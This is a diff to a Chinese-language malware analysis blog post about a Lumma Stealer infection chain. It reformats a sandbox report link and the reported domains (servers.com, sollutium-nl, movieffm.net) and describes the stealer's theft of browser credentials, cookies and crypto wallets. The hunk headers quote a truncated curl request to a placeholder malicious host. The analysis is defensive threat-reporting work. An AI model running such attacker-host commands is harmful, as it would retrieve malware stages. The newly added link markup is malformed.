@@ -90,7 +90,7 @@ curl -s -X GET "http://malicious.site/gbg7/" -H "User-Agent: Mozilla/5.0 (Window
 
 分析報告確認，該腳本的最終 payload 為 Lumma Stealer，這是一款知名的資訊竊取惡意軟體。一旦執行，它會掃描受感染的電腦，竊取儲存在瀏覽器中的敏感資料（如密碼、Cookies、信用卡資訊）、加密貨幣錢包、系統資訊等，並將所有資料打包後傳送到攻擊者的 C2 (Command & Control) 伺服器。
 
-沙盒分析連結: https://app.any.run/tasks/29c82282-2320-4c94-9529-b5591287fe03
+沙盒分析連結: [https://app.any.run/tasks/29c82282-2320-4c94-9529-b5591287fe03][https://app.any.run/tasks/29c82282-2320-4c94-9529-b5591287fe03]]
 
 ![any.run result](/img/in-post/movieLumma/image-15.png)
 
@@ -110,13 +110,13 @@ curl -s -X GET "http://malicious.site/gbg7/" -H "User-Agent: Mozilla/5.0 (Window
 ## 責任通報與生態系防禦
 本次分析中相關連結已向相關單位通報。 
 
-`servers.com`
+servers.com
 ![alt text](/img/in-post/movieLumma/image-16.png)
 
-`sollutium-nl`
+sollutium-nl
 ![alt text](/img/in-post/movieLumma/image-18.png)
 
-`movieffm.net`
+movieffm.net
 ![alt text](/img/in-post/movieLumma/image-19.png)
 
 ## 附錄：樣本資訊
